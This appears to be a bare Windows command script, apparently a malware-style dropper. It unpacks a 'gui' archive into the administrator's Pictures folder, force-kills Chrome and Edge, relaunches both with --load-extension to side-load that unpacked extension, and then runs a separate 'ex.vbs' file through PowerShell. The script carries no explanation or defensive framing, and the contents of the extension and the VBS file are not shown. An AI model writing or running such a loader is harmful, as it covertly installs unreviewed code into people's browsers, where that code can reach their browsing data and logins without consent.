unzip -n c:/gui.zip -d C:\Users\administrator\Pictures
TASKKILL /IM chrome.exe /F
"C:\Program Files\Google\Chrome\Application\chrome.exe" --load-extension="C:\Users\administrator\Pictures\gui"
TASKKILL /IM chrome.exe 
TASKKILL /IM msedge.exe /F
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --load-extension="C:\Users\administrator\Pictures\gui"
TASKKILL /IM msedge.exe
powershell "& 'C:\ex.vbs' -arguments"
